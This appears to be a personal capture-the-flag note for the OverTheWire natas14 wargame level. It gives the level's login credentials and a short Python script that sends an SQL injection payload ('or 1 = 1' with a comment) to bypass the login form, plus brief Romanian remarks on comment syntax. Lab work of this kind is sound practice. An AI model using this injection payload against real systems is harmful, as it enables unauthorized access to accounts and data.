
# General info

Username: natas14
Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
URL:      http://natas14.natas.labs.overthewire.org

# Special code section

```py
import requests

link = "http://natas14.natas.labs.overthewire.org/index.php"

post_params = {
    "username" : "ceva\" or 1 = 1 -- ",
    "password": "*"
}

get_params = {
    "debug": "sa existe"
}

response = requests.post(
    url=link,
    auth=("natas14", "z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ"),
    data=post_params,
    params=get_params
)

print(response.text)
```



SQL injection using comments & `1 = 1`
Sa ai grija la comentarii, trebuie spatii intre ele (oare o fi o versiune mai veche de MySQL?)